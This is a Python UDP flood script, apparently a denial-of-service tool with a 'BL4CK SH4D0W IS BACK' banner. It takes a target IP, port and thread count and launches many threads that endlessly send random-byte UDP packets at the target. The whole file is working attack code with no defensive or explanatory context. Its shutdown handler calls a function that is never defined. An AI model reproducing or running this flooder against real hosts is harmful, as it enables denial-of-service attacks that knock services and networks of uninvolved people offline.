import signal
import time
import socket
import random
import threading
import sys
import os
from os import system

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])

def run1():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run2():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run3():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run4():
	data = random._urandom(781)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run5():
	data = random._urandom(1050)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run6():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run7():
	data = random._urandom(999)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

def run8():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
		except:
			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")

# Multiple threads
os.system('cls' if os.name=='nt' else 'clear')
for x in range(threads):
	attack1 = threading.Thread(target = run1)
	attack1.start()
	attack2 = threading.Thread(target = run2)
	attack2.start()
	attack3 = threading.Thread(target = run3)
	attack3.start()
	attack4 = threading.Thread(target = run4)
	attack4.start()

for i in range(threads):
	attack5 = threading.Thread(target = run5)
	attack5.start()
	attack6 = threading.Thread(target = run6)
	attack6.start()
	attack7 = threading.Thread(target = run7)
	attack7.start()
	attack8 = threading.Thread(target = run8)
	attack8.start()

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
